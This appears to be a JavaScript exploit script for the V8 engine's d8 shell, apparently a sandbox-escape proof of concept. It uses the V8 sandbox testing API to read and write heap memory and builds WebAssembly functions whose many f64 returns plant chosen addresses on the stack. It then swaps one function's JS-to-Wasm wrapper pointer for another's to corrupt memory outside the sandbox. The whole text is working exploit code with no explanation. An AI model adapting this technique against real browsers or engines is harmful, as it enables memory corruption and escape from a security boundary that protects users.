class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);

        this.roots = new Array(0x30000);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0];
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1];
    }

    add_ref(object) {
        this.roots[this.index++] = object;
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            // fill up new space external backing store bytes
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }

    hex(i) {
        return i.toString(16).padStart(16, "0");
    }

    breakpoint() {
        this.buf.slice();
    }
}

var helper = new Helpers();

// =================== //
//     Start here!     //
// =================== //

var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var addrOf = (o) => Sandbox.getAddressOf(o);

var dv = new DataView(sbxMemView);

var readHeap4 = (offset) => dv.getUint32(offset, true);
var readHeap8 = (offset) => dv.getBigUint64(offset, true);

var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);

let arr = [4.94065645841246544176568792868E-324];
helper.scavenge_gc();
helper.mark_sweep_gc();

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

let builder = new WasmModuleBuilder();

builder.addFunction('write', makeSig([], [])).exportFunc().addBody([
]);

let cagebase = BigInt(Sandbox.base);
let target = BigInt(Sandbox.targetPage);
let arr_addr = addrOf(arr);
let elements = readHeap4(arr_addr + 8);
let one_addr = BigInt(elements + 7) + cagebase;

builder.addFunction('write2', makeSig([], [kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64, kWasmF64])).exportFunc()
    .addBody([
        ...wasmF64Const(helper.i64tof64(one_addr)),
        ...wasmF64Const(helper.i64tof64(one_addr)),
        ...wasmF64Const(helper.i64tof64(one_addr)), // rbp-0x20
        ...wasmF64Const(0),                         // rbp-0x18
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
        ...wasmF64Const(helper.i64tof64(target)),
    ]);

let instance = builder.instantiate({});
let write = instance.exports.write;
let write2 = instance.exports.write2;

for (var i = 0; i < 1001; i++) {
    write();
}
for (var i = 0; i < 1001; i++) {
    write2();
}

let jstowasm_write = readHeap4(addrOf(write) + 0xc);
writeHeap4(addrOf(write2) + 0xc, jstowasm_write);

write2();
